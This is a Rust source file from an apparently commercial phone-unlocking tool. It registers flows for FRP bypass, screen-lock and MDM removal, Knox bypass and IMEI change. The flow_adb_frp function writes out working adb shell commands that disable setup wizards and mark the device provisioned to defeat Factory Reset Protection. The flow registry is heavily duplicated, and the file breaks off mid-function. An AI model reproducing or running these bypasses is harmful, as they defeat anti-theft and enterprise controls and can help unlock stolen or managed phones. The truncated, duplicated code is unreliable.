//! Flow engine — the operations layer in Rust (the "everything except the
//! GUI" rule). Python keeps only the PyQt6 GUI; every flow the app supports
//! is registered here and executed by the bridge.
//!
//! Phase 1 ports the ADB step-sequence flows (adb_frp, setup_wizard,
//! factory_reset, screen_lock_remove, repair_settings). Later phases move
//! the fastboot/moto and flashing-engine flows in.
//!
//! CLI surface:
//!   flow-list                JSON list of every flow (key, label, job, mode)
//!   flow-run <key> [serial]  execute one flow, print the transcript
//!
//! Transports: the native ADB (`adb::shell_cli`) — target-pinned, no daemon.
//! A flow's device-side FAIL is not a transport error; the transcript keeps
//! going so a single failing step does not abort the sequence (matching the
//! Python flows' per-step try/except behaviour).

use crate::adb;
use crate::error::{BridgeError, Result};
use serde_json::json;
use serde::Serialize;
use std::thread;
use std::time::{Duration, Instant};

/// One registered flow: key, human label, and the job+mode the GUI maps it to.
#[derive(Debug, Clone, Serialize)]
pub struct FlowSpec {
    pub key: &'static str,
    pub label: &'static str,
    pub job: &'static str,
    pub mode: &'static str,
}

macro_rules! flow {
    ($key:expr, $label:expr, $job:expr, $mode:expr) => {
        FlowSpec { key: $key, label: $label, job: $job, mode: $mode }
    };
}

/// The registry — every flow the app supports. The GUI renders its menus
/// from `flow-list` (JSON); `flow-run <key>` executes one.
pub fn flows() -> Vec<FlowSpec> {
    vec![
        flow!("odin_preflight", "Pre-flight validation", "Flash Firmware", "ADB"),
        flow!("odin_advanced_flash", "Advanced flash (AP/BL/CP/CSC + Unofficial)", "Flash Firmware", "ADB"),
        flow!("odin_flash_tar", "Flash firmware tar (native)", "Flash Firmware", "ADB"),
        flow!("odin_check_tar", "Check firmware archive (native)", "Flash Firmware", "ADB"),
        flow!("odin_efs_backup", "EFS backup", "Flash Firmware", "ADB"),
        flow!("odin_efs_restore", "EFS restore", "Flash Firmware", "ADB"),
        flow!("odin_sales_code", "Change sales code (CSC)", "Flash Firmware", "ADB"),
        flow!("odin_preflight", "Pre-flight validation", "Flash Firmware", "MTP"),
        flow!("odin_advanced_flash", "Advanced flash (AP/BL/CP/CSC + Unofficial)", "Flash Firmware", "MTP"),
        flow!("odin_flash_tar", "Flash firmware tar (native)", "Flash Firmware", "MTP"),
        flow!("odin_check_tar", "Check firmware archive (native)", "Flash Firmware", "MTP"),
        flow!("odin_list_devices", "List download devices (native)", "Flash Firmware", "MTP"),
        flow!("odin_preflight", "Pre-flight validation", "Flash Firmware", "Download mode"),
        flow!("odin_advanced_flash", "Advanced flash (AP/BL/CP/CSC + Unofficial)", "Flash Firmware", "Download mode"),
        flow!("odin_flash_tar", "Flash firmware tar (native)", "Flash Firmware", "Download mode"),
        flow!("odin_check_tar", "Check firmware archive (native)", "Flash Firmware", "Download mode"),
        flow!("odin_list_devices", "List download devices (native)", "Flash Firmware", "Download mode"),
        flow!("odin_pit_tools", "PIT tools (dump/compare/repartition)", "Flash Firmware", "Download mode"),
        flow!("odin_flash_partition", "Flash single partition (raw)", "Flash Firmware", "Download mode"),
        flow!("odin_flash_multi", "Flash multiple partitions (native Odin)", "Flash Firmware", "Download mode"),
        flow!("odin_send_pit", "Send PIT to device (repartition)", "Flash Firmware", "Download mode"),
        flow!("odin_vbmeta", "VBMETA / AVB signature control", "Flash Firmware", "Download mode"),
        flow!("drk_repair", "DRK repair (BL+CP reflash guide)", "Flash Firmware", "Download mode"),
        flow!("reboot_normal", "reboot normally", "Flash Firmware", "Download mode"),
        flow!("odin_preflight", "Pre-flight validation", "Flash Firmware", "Samsung BROM"),
        flow!("odin_advanced_flash", "Advanced flash (AP/BL/CP/CSC + Unofficial)", "Flash Firmware", "Samsung BROM"),
        flow!("odin_flash_tar", "Flash firmware tar (native)", "Flash Firmware", "Samsung BROM"),
        flow!("odin_check_tar", "Check firmware archive (native)", "Flash Firmware", "Samsung BROM"),
        flow!("odin_list_devices", "List download devices (native)", "Flash Firmware", "Samsung BROM"),
        flow!("odin_pit_tools", "PIT tools (dump/compare/repartition)", "Flash Firmware", "Samsung BROM"),
        flow!("odin_flash_partition", "Flash single partition (raw)", "Flash Firmware", "Samsung BROM"),
        flow!("odin_flash_multi", "Flash multiple partitions (native Odin)", "Flash Firmware", "Samsung BROM"),
        flow!("odin_send_pit", "Send PIT to device (repartition)", "Flash Firmware", "Samsung BROM"),
        flow!("odin_vbmeta", "VBMETA / AVB signature control", "Flash Firmware", "Samsung BROM"),
        flow!("mtk_auth_flash", "MTK auth-bypass flash (signed devices)", "Flash Firmware", "MTK"),
        flow!("mtk_auth_flash", "MTK auth-bypass flash (signed devices)", "Flash Firmware", "MTK BROM"),
        flow!("adb_frp", "ADB FRP clear", "Remove FRP", "ADB"),
        flow!("frp_qr_provision", "FRP bypass (QR provisioning, Android 10-14)", "Remove FRP", "ADB"),
        flow!("frp_fake_login", "FRP fake-login (own DPC + QR provisioning)", "Remove FRP", "ADB"),
        flow!("frp_fake_login_testdpc", "FRP fake-login (TestDPC + QR)", "Remove FRP", "ADB"),
        flow!("frp_fake_login_adp", "FRP fake-login (Device Policy + QR)", "Remove FRP", "ADB"),
        flow!("frp_alliance", "FRP bypass (Alliance Shield, Knox admin)", "Remove FRP", "ADB"),
        flow!("frp_browser", "frp bypass (browser)", "Remove FRP", "ADB"),
        flow!("frp_emergency", "frp bypass (emergency call)", "Remove FRP", "ADB"),
        flow!("frp_settings", "frp bypass (settings)", "Remove FRP", "ADB"),
        flow!("huawei_frp_guide", "Huawei FRP guide (honest scope)", "Remove FRP", "ADB"),
        flow!("moto_frp_adb", "Motorola FRP reset (ADB)", "Remove FRP", "ADB"),
        flow!("at_method", "bypass FRP (MTP/AT, commercial)", "Remove FRP", "MTP"),
        flow!("enable_adb", "enable usb debugging (adb) — strong", "Remove FRP", "MTP"),
        flow!("test_mode", "Test mode (*#0*#) ADB bypass", "Remove FRP", "MTP"),
        flow!("download_frp", "FRP clear (download mode - combo firmware + ADB)", "Remove FRP", "Download mode"),
        flow!("odin_enable_adb", "Enable ADB (download mode - combo firmware)", "Remove FRP", "Download mode"),
        flow!("download_frp", "FRP clear (download mode - combo firmware + ADB)", "Remove FRP", "Samsung BROM"),
        flow!("odin_enable_adb", "Enable ADB (download mode - combo firmware)", "Remove FRP", "Samsung BROM"),
        flow!("mtk_combo_flash", "flash combination firmware (MediaTek)", "Remove FRP", "MTK"),
        flow!("fastboot_frp", "fastboot FRP bypass", "Remove FRP", "FASTBOOT"),
        flow!("fastboot_unlock", "fastboot unlock bootloader", "Remove FRP", "FASTBOOT"),
        flow!("fastboot_wipe", "fastboot wipe userdata", "Remove FRP", "FASTBOOT"),
        flow!("moto_frp_fastboot", "Motorola FRP remove (fastboot · CVE-2016-10277)", "Remove FRP", "FASTBOOT"),
        flow!("edl_auto", "edl_auto", "Remove FRP", "EDL"),
        flow!("edl_frp", "edl_frp", "Remove FRP", "EDL"),
        flow!("edl_enable_adb", "edl_enable_adb", "Remove FRP", "EDL"),
        flow!("edl_detect", "edl_detect", "Remove FRP", "EDL"),
        flow!("qcom_verify", "Qualcomm verify-after-write (SHA-256)", "Remove FRP", "EDL"),
        flow!("screen_lock_remove", "screen lock remove (ADB)", "Remove Screen Lock", "ADB"),
        flow!("screen_lock_locksettings", "screen lock remove (ADB locksettings, Android 8/9)", "Remove Screen Lock", "ADB"),
        flow!("screen_lock_csc", "screen lock remove (adb or CSC flash - factory reset)", "Remove Screen Lock", "ADB"),
        flow!("screen_lock_recovery", "screen lock remove (Recovery)", "Remove Screen Lock", "ADB"),
        flow!("screen_lock_comprehensive", "screen lock remove (Comprehensive)", "Remove Screen Lock", "ADB"),
        flow!("enable_adb", "enable usb debugging (adb) — strong", "Remove Screen Lock", "MTP"),
        flow!("test_mode", "Test mode (*#0*#) ADB bypass", "Remove Screen Lock", "MTP"),
        flow!("screen_lock_download", "Remove Screen Lock (download mode - combo firmware + ADB)", "Remove Screen Lock", "Download mode"),
        flow!("screen_lock_csc", "screen lock remove (adb or CSC flash - factory reset)", "Remove Screen Lock", "Download mode"),
        flow!("odin_enable_adb", "Enable ADB (download mode - combo firmware)", "Remove Screen Lock", "Download mode"),
        flow!("screen_lock_download", "Remove Screen Lock (download mode - combo firmware + ADB)", "Remove Screen Lock", "Samsung BROM"),
        flow!("screen_lock_csc", "screen lock remove (adb or CSC flash - factory reset)", "Remove Screen Lock", "Samsung BROM"),
        flow!("odin_enable_adb", "Enable ADB (download mode - combo firmware)", "Remove Screen Lock", "Samsung BROM"),
        flow!("mtk_recovery_reset", "recovery factory reset (MediaTek)", "Remove Screen Lock", "MTK"),
        flow!("mtk_combo_flash", "flash combination firmware (MediaTek)", "Remove Screen Lock", "MTK"),
        flow!("fastboot_wipe", "fastboot wipe userdata", "Remove Screen Lock", "FASTBOOT"),
        flow!("fastboot_erase", "fastboot erase partition", "Remove Screen Lock", "FASTBOOT"),
        flow!("fastboot_frp", "fastboot FRP bypass", "Remove Screen Lock", "FASTBOOT"),
        flow!("screen_lock_edl", "screen lock remove (EDL)", "Remove Screen Lock", "EDL"),
        flow!("adb_info", "adb read info", "Read Device Info", "ADB"),
        flow!("kg_state_check", "KG state check", "Read Device Info", "ADB"),
        flow!("oem_unlock_guide", "bootloader unlock guide (checks + steps)", "Read Device Info", "ADB"),
        flow!("recovery", "recovery mode", "Read Device Info", "ADB"),
        flow!("at_info", "at read info (MTP/AT)", "Read Device Info", "MTP"),
        flow!("enable_adb", "enable usb debugging (adb) — strong", "Read Device Info", "MTP"),
        flow!("test_mode", "Test mode (*#0*#) ADB bypass", "Read Device Info", "MTP"),
        flow!("download_mode_info", "download mode info (real Odin read)", "Read Device Info", "Download mode"),
        flow!("kg_state_check", "KG state check", "Read Device Info", "Download mode"),
        flow!("download_mode_info", "download mode info (real Odin read)", "Read Device Info", "Samsung BROM"),
        flow!("mtk_download_info", "MediaTek download info", "Read Device Info", "MTK"),
        flow!("mtk_brom_info", "MediaTek BROM / preloader detection", "Read Device Info", "MTK"),
        flow!("mtk_brom_backup", "MTK BROM read & backup (bootloader + security area)", "Read Device Info", "MTK"),
        flow!("mtk_crash_brom", "MTK crash preloader into BROM", "Read Device Info", "MTK BROM"),
        flow!("mtk_brom_info", "MediaTek BROM / preloader detection", "Read Device Info", "MTK BROM"),
        flow!("mtk_brom_backup", "MTK BROM read & backup (bootloader + security area)", "Read Device Info", "MTK BROM"),
        flow!("mtk_verify", "MTK verify-after-write (SHA-256)", "Read Device Info", "MTK BROM"),
        flow!("fastboot_devices", "fastboot list devices", "Read Device Info", "FASTBOOT"),
        flow!("fastboot_getvar", "fastboot getvar all", "Read Device Info", "FASTBOOT"),
        flow!("fastboot", "fastboot device overview", "Read Device Info", "FASTBOOT"),
        flow!("oem_unlock_guide", "bootloader unlock guide (checks + steps)", "Read Device Info", "FASTBOOT"),
        flow!("edl_detect", "edl_detect", "Read Device Info", "EDL"),
        flow!("qcom_detect_info", "Qualcomm detect + info (read-only)", "Read Device Info", "EDL"),
        flow!("qcom_verify", "Qualcomm verify-after-write (SHA-256)", "Read Device Info", "EDL"),
        flow!("spd_detect_info", "SPD detect + info (read-only)", "Read Device Info", "SPD"),
        flow!("detect", "detect", "Detect Devices", "ADB"),
        flow!("detect", "detect", "Detect Devices", "MTP"),
        flow!("detect", "detect", "Detect Devices", "Download mode"),
        flow!("detect", "detect", "Detect Devices", "Samsung BROM"),
        flow!("mtk_download_info", "MediaTek download info", "Detect Devices", "MTK"),
        flow!("mtk_brom_info", "MediaTek BROM / preloader detection", "Detect Devices", "MTK"),
        flow!("mtk_brom_backup", "MTK BROM read & backup (bootloader + security area)", "Detect Devices", "MTK"),
        flow!("mtk_crash_brom", "MTK crash preloader into BROM", "Detect Devices", "MTK BROM"),
        flow!("mtk_brom_info", "MediaTek BROM / preloader detection", "Detect Devices", "MTK BROM"),
        flow!("mtk_brom_backup", "MTK BROM read & backup (bootloader + security area)", "Detect Devices", "MTK BROM"),
        flow!("fastboot_devices", "fastboot list devices", "Detect Devices", "FASTBOOT"),
        flow!("fastboot_getvar", "fastboot getvar all", "Detect Devices", "FASTBOOT"),
        flow!("fastboot", "fastboot device overview", "Detect Devices", "FASTBOOT"),
        flow!("detect", "detect", "Detect Devices", "EDL"),
        flow!("qcom_detect_info", "Qualcomm detect + info (read-only)", "Detect Devices", "EDL"),
        flow!("spd_detect_info", "SPD detect + info (read-only)", "Detect Devices", "SPD"),
        flow!("reboot_recovery", "reboot to recovery", "Reboot", "ADB"),
        flow!("reboot_download", "reboot to download mode", "Reboot", "ADB"),
        flow!("reboot_normal", "reboot normally", "Reboot", "ADB"),
        flow!("reboot_edl", "reboot to EDL (Qualcomm)", "Reboot", "ADB"),
        flow!("reboot_bootloader", "reboot to fastboot/bootloader", "Reboot", "ADB"),
        flow!("reboot_recovery", "reboot to recovery", "Reboot", "MTP"),
        flow!("reboot_download", "reboot to download mode", "Reboot", "MTP"),
        flow!("reboot_normal", "reboot normally", "Reboot", "MTP"),
        flow!("reboot_normal", "reboot normally", "Reboot", "Download mode"),
        flow!("reboot_normal", "reboot normally", "Reboot", "Samsung BROM"),
        flow!("reboot_normal", "reboot normally", "Reboot", "MTK"),
        flow!("fastboot_reboot", "fastboot reboot", "Reboot", "FASTBOOT"),
        flow!("fastboot_reboot_bootloader", "fastboot reboot to bootloader", "Reboot", "FASTBOOT"),
        flow!("fastboot_recovery", "fastboot reboot to recovery", "Reboot", "FASTBOOT"),
        flow!("fastboot_continue", "fastboot continue boot", "Reboot", "FASTBOOT"),
        flow!("reboot_normal", "reboot normally", "Reboot", "EDL"),
        flow!("repair_settings", "repair settings app crash (A14 / A145P etc.)", "Repair Settings", "ADB"),
        flow!("fix_adb_auth", "Fix ADB authorization (unauthorized, no dialog)", "Repair Settings", "ADB"),
        flow!("enable_adb", "enable usb debugging (adb) — strong", "Repair Settings", "MTP"),
        flow!("test_mode", "Test mode (*#0*#) ADB bypass", "Repair Settings", "MTP"),
        flow!("carrier_lock_status", "carrier lock status (read-only)", "Unlock Carrier", "ADB"),
        flow!("carrier_lock_mtk", "MTK nvram simlock read/backup/analyze (A05/A06)", "Unlock Carrier", "MTK BROM"),
        flow!("mdm_diagnostics", "mdm diagnostics / analysis", "Remove MDM", "ADB"),
        flow!("mdm_unlock", "mdm / device-owner unlock - smart", "Remove MDM", "ADB"),
        flow!("mdm_unlock_comprehensive", "mdm / device-owner unlock - comprehensive / deep", "Remove MDM", "ADB"),
        flow!("mdm_unlock_recovery", "mdm / device-owner unlock - recovery (no wipe)", "Remove MDM", "ADB"),
        flow!("mdm_unlock_recovery_wipe", "mdm / device-owner unlock - recovery (with user-data wipe)", "Remove MDM", "ADB"),
        flow!("mdm_qr", "mdm qr code generator (Android Enterprise)", "Remove MDM", "ADB"),
        flow!("enable_adb", "enable usb debugging (adb) — strong", "Remove MDM", "MTP"),
        flow!("test_mode", "Test mode (*#0*#) ADB bypass", "Remove MDM", "MTP"),
        flow!("fastboot_wipe", "fastboot wipe userdata", "Remove MDM", "FASTBOOT"),
        flow!("fastboot_frp", "fastboot FRP bypass", "Remove MDM", "FASTBOOT"),
        flow!("knox_check", "Knox warranty check (EXPERIMENTAL)", "Knox / Warranty", "ADB"),
        flow!("kg_remove", "KG remove (patch vbmeta)", "Knox / Warranty", "ADB"),
        flow!("knox_check", "Knox warranty check (EXPERIMENTAL)", "Knox / Warranty", "Download mode"),
        flow!("knox_bypass", "Knox bypass (EXPERIMENTAL — irreversible)", "Knox / Warranty", "Download mode"),
        flow!("knox_check", "Knox warranty check (EXPERIMENTAL)", "Knox / Warranty", "Samsung BROM"),
        flow!("knox_bypass", "Knox bypass (EXPERIMENTAL — irreversible)", "Knox / Warranty", "Samsung BROM"),
        flow!("qcn_backup", "QCN backup (EXPERIMENTAL)", "QCN / Modem", "ADB"),
        flow!("qcn_nv_browser", "QCN NV browser (backup inspector)", "QCN / Modem", "ADB"),
        flow!("qcn_efs_explorer", "QCN EFS explorer (backup inspector)", "QCN / Modem", "ADB"),
        flow!("qcn_backup", "QCN backup (EXPERIMENTAL)", "QCN / Modem", "EDL"),
        flow!("qcn_restore", "QCN restore (EXPERIMENTAL)", "QCN / Modem", "EDL"),
        flow!("qcn_imei_repair", "QCN IMEI repair (EXPERIMENTAL — restore-only)", "QCN / Modem", "EDL"),
        flow!("qcn_nv_browser", "QCN NV browser (backup inspector)", "QCN / Modem", "EDL"),
        flow!("qcn_efs_explorer", "QCN EFS explorer (backup inspector)", "QCN / Modem", "EDL"),
        flow!("imei_repair_mtk", "MTK IMEI repair (EXPERIMENTAL — restore-only)", "IMEI Repair / Change", "ADB"),
        flow!("imei_repair_spd", "SPD IMEI repair (EXPERIMENTAL — restore-only)", "IMEI Repair / Change", "ADB"),
        flow!("imei_change_spd", "SPD IMEI change (EXPERIMENTAL — double-gated)", "IMEI Repair / Change", "ADB"),
        flow!("imei_repair_mtk", "MTK IMEI repair (EXPERIMENTAL — restore-only)", "IMEI Repair / Change", "MTK BROM"),
        flow!("imei_change_mtk", "MTK IMEI change (EXPERIMENTAL — double-gated)", "IMEI Repair / Change", "MTK BROM"),
        flow!("qcn_imei_repair", "QCN IMEI repair (EXPERIMENTAL — restore-only)", "IMEI Repair / Change", "EDL"),
        flow!("emmc_health", "eMMC/UFS health (read-only)", "eMMC / UFS", "ADB"),
        flow!("emmc_raw", "eMMC/UFS raw NAND (EXPERIMENTAL — brick risk)", "eMMC / UFS", "ADB"),
        flow!("factory_reset", "factory reset", "Remove FRP", "ADB"),
        flow!("setup_wizard", "Setup Wizard ADB bypass", "Remove FRP", "ADB"),
        flow!("fastboot_flash", "fastboot flash partition", "Flash Firmware", "FASTBOOT"),
        flow!("fastboot_format", "fastboot format partition", "Flash Firmware", "FASTBOOT"),
        flow!("fastboot_lock", "fastboot relock bootloader", "Flash Firmware", "FASTBOOT"),
        flow!("fastboot_set_active", "fastboot set active slot", "Flash Firmware", "FASTBOOT"),
        flow!("fastboot_oem", "fastboot oem command", "Flash Firmware", "FASTBOOT"),
        flow!("apple_info", "Apple info (EXPERIMENTAL — read-only)", "Read Device Info", "ADB"),
        flow!("apple_passcode_guide", "iPhone passcode scope guide (honest)", "Read Device Info", "ADB"),
        flow!("apple_icloud_remove", "Apple iCloud Remove (EXPERIMENTAL — edu only)", "Read Device Info", "ADB"),
        flow!("apple_icloud_add", "Apple iCloud Add (EXPERIMENTAL — edu only)", "Read Device Info", "ADB"),
        flow!("ofp_extract", "Oppo OFP prepare (extract / guidance)", "Flash Firmware", "SPD"),
        flow!("pac_extract", "SPD PAC extract (file to folder)", "Flash Firmware", "SPD"),
        flow!("pac_pack", "SPD PAC pack (folder to file)", "Flash Firmware", "SPD"),
       flow!("reboot_normal", "reboot normally", "Reboot", "ADB"),
        flow!("reboot_recovery", "reboot to recovery", "Reboot", "ADB"),
        flow!("reboot_download", "reboot to download mode", "Reboot", "ADB"),
        flow!("reboot_edl", "reboot to EDL (Qualcomm)", "Reboot", "ADB"),
        flow!("reboot_bootloader", "reboot to fastboot/bootloader", "Reboot", "ADB"),
        flow!("recovery", "reboot to recovery (adb)", "Read Device Info", "ADB"),
        flow!("fastboot_reboot_bootloader", "fastboot reboot to bootloader", "Reboot", "FASTBOOT"),
        flow!("fastboot_recovery", "fastboot reboot to recovery", "Reboot", "FASTBOOT"),
        flow!("fastboot_continue", "fastboot continue boot", "Reboot", "FASTBOOT"),
        flow!("fastboot_set_active", "fastboot set active slot", "Flash Firmware", "FASTBOOT"),
        flow!("fastboot_devices", "fastboot devices", "Detect Devices", "FASTBOOT"),
        flow!("fastboot_getvar", "fastboot getvar", "Detect Devices", "FASTBOOT"),
        flow!("fastboot", "fastboot raw command", "Detect Devices", "FASTBOOT"),
       flow!("adb_info", "adb read info", "Read Device Info", "ADB"),
        flow!("kg_state_check", "Knox Guard (KG) state check", "Read Device Info", "ADB"),
        flow!("detect", "Full device detection (all USB)", "Detect Devices", "ADB"),
        flow!("download_mode_info", "download mode info (real Odin read)", "Read Device Info", "Download mode"),
        flow!("mtk_download_info", "MediaTek download mode info", "Read Device Info", "MTK"),
        flow!("spd_detect_info", "SPD/UNISOC detect + info (read-only)", "Read Device Info", "SPD"),
        flow!("qcom_detect_info", "Qualcomm detect + Sahara info (read-only)", "Read Device Info", "EDL"),
       flow!("moto_frp_adb", "Motorola FRP reset (adb)", "Remove FRP", "ADB"),
        flow!("screen_lock_locksettings", "Screen lock removal (locksettings)", "Remove Screen Lock", "ADB"),
        flow!("frp_browser", "frp bypass (browser)", "Remove FRP", "ADB"),
        flow!("frp_emergency", "frp bypass (emergency call)", "Remove FRP", "ADB"),
        flow!("frp_settings", "frp bypass (settings)", "Remove FRP", "ADB"),
        flow!("test_mode", "test mode (*#0*#) + ADB bypass", "Remove FRP", "MTP"),
        flow!("oem_unlock_guide", "Bootloader unlock guide (no writes)", "Read Device Info", "ADB"),
        flow!("huawei_frp_guide", "Huawei / Honor FRP guide", "Remove FRP", "ADB"),
        flow!("fix_adb_auth", "Fix ADB authorization", "Repair Settings", "ADB"),
        flow!("screen_lock_csc", "Screen lock removal (adb + CSC fallback)", "Remove Screen Lock", "ADB"),
        flow!("screen_lock_comprehensive", "Comprehensive screen lock removal", "Remove Screen Lock", "ADB"),
       flow!("odin_list_devices", "List download devices (native)", "Flash Firmware", "MTP"),
        flow!("odin_flash_tar", "Flash firmware tar (native)", "Flash Firmware", "ADB"),
        flow!("odin_check_tar", "Check firmware archive (native)", "Flash Firmware", "ADB"),
        flow!("carrier_lock_status", "Carrier / SIM-lock status check", "Unlock Carrier", "ADB"),
        flow!("mtk_verify", "MTK verify-after-write (read back + SHA-256)", "Read Device Info", "MTK BROM"),
       flow!("carrier_lock_mtk", "Carrier unlock via AT chain (MTK)", "Unlock Carrier", "MTK BROM"),
        flow!("mtk_brom_info", "MediaTek BROM info (extended detect)", "Read Device Info", "MTK BROM"),
        flow!("mtk_crash_brom", "MTK crash preloader to BROM", "Read Device Info", "MTK BROM"),
        flow!("qcom_verify", "Qualcomm verify-after-write", "Read Device Info", "EDL"),
        flow!("edl_detect", "EDL detect (watch 05c6:9008)", "Detect Devices", "EDL"),
        flow!("apple_info", "Apple device info (read-only, EXPERIMENTAL)", "Read Device Info", "ADB"),
        flow!("pac_extract", "Extract SPD PAC container", "Flash Firmware", "SPD"),
        flow!("pac_pack", "Pack folder to PAC container", "Flash Firmware", "SPD"),
        flow!("emmc_health", "eMMC / UFS health read", "eMMC / UFS", "ADB"),
        flow!("qcn_backup", "QCN backup (modemst over EDL)", "QCN / Modem", "EDL"),
        flow!("at_info", "MTP / AT target info", "Read Device Info", "MTP"),
       flow!("knox_check", "Knox warranty check (EXPERIMENTAL)", "Knox / Warranty", "ADB"),
        flow!("fastboot_lock", "fastboot re-lock bootloader", "Flash Firmware", "FASTBOOT"),
        flow!("screen_lock_recovery", "Screen lock removal (recovery menu)", "Remove Screen Lock", "ADB"),
       flow!("download_frp", "FRP bypass - download mode (combo + adb)", "Remove FRP", "Download mode"),
        flow!("odin_enable_adb", "Enable ADB - download mode (combo firmware)", "Remove FRP", "Download mode"),
        flow!("mtk_combo_flash", "MediaTek combo firmware flash", "Remove FRP", "MTK"),
        flow!("mtk_recovery_reset", "Recovery factory reset (guided, no PC)", "Remove Screen Lock", "MTK"),
        flow!("screen_lock_download", "Screen lock removal - download mode (combo + adb)", "Remove Screen Lock", "Download mode"),
        flow!("drk_repair", "Samsung DRK repair guidance", "Flash Firmware", "Download mode"),
       flow!("odin_sales_code", "Change sales code (CSC)", "Flash Firmware", "ADB"),
        flow!("odin_efs_backup", "EFS backup", "Flash Firmware", "ADB"),
        flow!("odin_efs_restore", "EFS restore", "Flash Firmware", "ADB"),
        flow!("odin_pit_tools", "PIT tools (dump / compare)", "Flash Firmware", "Download mode"),
        flow!("odin_flash_partition", "Flash one partition (native)", "Flash Firmware", "Download mode"),
        flow!("odin_flash_multi", "Flash multiple partitions (native)", "Flash Firmware", "Download mode"),
        flow!("odin_send_pit", "Send PIT (repartition, ADVANCED)", "Flash Firmware", "Download mode"),
       flow!("frp_qr_provision", "FRP bypass - QR provisioning", "Remove FRP", "ADB"),
        flow!("frp_fake_login", "FRP fake-login - own DPC + QR", "Remove FRP", "ADB"),
        flow!("frp_fake_login_testdpc", "FRP fake-login - TestDPC + QR", "Remove FRP", "ADB"),
        flow!("frp_fake_login_adp", "FRP fake-login - Device Policy + QR", "Remove FRP", "ADB"),
        flow!("frp_alliance", "FRP bypass - Alliance Shield (Knox)", "Remove FRP", "ADB"),
        flow!("mdm_qr", "MDM provisioning QR generator", "Remove MDM", "ADB"),
        flow!("mdm_diagnostics", "MDM diagnostics (read-only)", "Remove MDM", "ADB"),
        flow!("mdm_unlock", "MDM unlock (smart path)", "Remove MDM", "ADB"),
        flow!("mdm_unlock_comprehensive", "MDM unlock (comprehensive / deep)", "Remove MDM", "ADB"),
        flow!("mdm_unlock_recovery", "MDM unlock - recovery (combo + adb)", "Remove MDM", "Download mode"),
        flow!("mdm_unlock_recovery_wipe", "MDM unlock - recovery + wipe", "Remove MDM", "Download mode"),
       flow!("mtk_auth_flash", "MTK auth-bypass flash (one-click)", "Flash Firmware", "MTK"),
        flow!("mtk_brom_backup", "MTK BROM partition backup (safety net)", "Read Device Info", "MTK BROM"),
        flow!("edl_auto", "EDL auto (FRP + ADB enable)", "Remove FRP", "EDL"),
        flow!("edl_frp", "EDL FRP reset (Firehose)", "Remove FRP", "EDL"),
        flow!("edl_enable_adb", "EDL ADB enable (Firehose persist patch)", "Remove FRP", "EDL"),
        flow!("odin_preflight", "Pre-flight validation suite", "Flash Firmware", "Download mode"),
        flow!("knox_bypass", "Knox bypass (EXPERIMENTAL)", "Knox / Warranty", "ADB"),
        flow!("kg_remove", "Knox Guard remove / disable", "Knox / Warranty", "ADB"),
        flow!("screen_lock_edl", "Screen lock removal - EDL mode", "Remove Screen Lock", "EDL"),
        flow!("apple_passcode_guide", "iPhone passcode guide", "Read Device Info", "ADB"),
    ]
}

/// `flow-list` — JSON array of every registered flow.
pub fn flow_list_cli() -> Result<String> {
    serde_json::to_string_pretty(&flows()).map_err(|e| BridgeError::Io(e.to_string()))
}

/// Wait for an authorized ADB device (state "device"). Polls the system
/// adb server rows; returns the first usable serial. Mirrors the Python
/// `_wait_for_adb` guidance in the transcript when unauthorized.
fn wait_authorized_adb(serial_want: &str, timeout: Duration, out: &mut Vec<String>) -> Option<String> {
    let deadline = Instant::now() + timeout;
    let mut last_hint = Instant::now() - Duration::from_secs(10);
    while Instant::now() < deadline {
        let rows = adb::devices_json_no_probe().unwrap_or_else(|_| "[]".to_string());
        for line in rows.lines() {
            let mut parts = line.splitn(2, '\t');
            let serial = parts.next().unwrap_or("");
            let rest = parts.next().unwrap_or("");
            let state = rest.split_whitespace().next().unwrap_or("");
            if state == "device" && (serial_want.is_empty() || serial == serial_want) {
                out.push(format!("adb device online: {serial} ({state})"));
                return Some(serial.to_string());
            }
            if state == "unauthorized" && last_hint.elapsed() > Duration::from_secs(10) {
                last_hint = Instant::now();
                out.push(format!(
                    "device {serial} connected but NOT authorized - the 'Allow USB \
                     debugging' dialog has not been accepted yet."
                ));
                out.push(
                    "  On the phone: the dialog only pops when the SCREEN IS ON AND \
                     UNLOCKED. Unlock it, then tap 'Always allow from this computer'."
                        .to_string(),
                );
            }
        }
        thread::sleep(Duration::from_secs(2));
    }
    out.push("timeout waiting for an AUTHORIZED adb device".to_string());
    None
}

/// Run one `adb shell` step over the native transport; a failure is logged
/// into the transcript as `ERROR: ...` instead of aborting the sequence.
fn adb_step(serial: &str, cmd: &str, timeout: Duration, out: &mut Vec<String>) {
    out.push(format!("  > adb shell {cmd}"));
    match adb::shell_cli(serial, timeout.as_millis() as u64, &[cmd.to_string()]) {
        Ok(text) => {
            if !text.trim().is_empty() {
                let first = text.lines().next().unwrap_or("");
                out.push(format!("      {}", &first[..first.len().min(120)]));
            }
        }
        Err(e) => out.push(format!("      ERROR: {e}")),
    }
}

/// `adb_frp` — mark setup complete / device provisioned and disable both
/// setup wizards so the phone boots straight to the launcher.
pub fn flow_adb_frp(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("PHONE: USB debugging must be on and this PC authorized".to_string());
    out.push("  (plug in, tap 'Always allow' on the 'Allow USB debugging' dialog).".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(60), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode { expected: "device (adb authorized)".to_string(), actual: "no adb device".to_string() })
    })?;
    let steps: &[(&str, &str)] = &[
        ("mark setup wizard run", "settings put global setup_wizard_has_run 1"),
        ("mark user setup complete", "settings put secure user_setup_complete 1"),
        ("mark device provisioned", "settings put global device_provisioned 1"),
        ("allow non-market apps", "settings put secure install_non_market_apps 1"),
        ("disable Google setup wizard", "pm disable-user --user 0 com.google.android.setupwizard"),
        ("disable Samsung setup wizard", "pm disable-user --user 0 com.sec.android.app.SecSetupWizard"),
        ("back to home", "am start -c android.intent.category.HOME -a android.intent.action.MAIN"),
    ];
    for (_, cmd) in steps {
        adb_step(&serial, cmd, Duration::from_secs(30), out);
        thread::sleep(Duration::from_millis(1200));
    }
    out.push("Done. Reboot the phone (adb reboot) - it should go straight to the launcher, FRP gone.".to_string());
    Ok(())
}

/// `setup_wizard` — classic ADB bypass for older Samsung setups + verify.
pub fn flow_setup_wizard(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(60), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode { expected: "device (adb authorized)".to_string(), actual: "no adb device".to_string() })
    })?;
    let commands: &[(&str, &str)] = &[
        ("unlock screens", "wm dismiss-keyguard"),
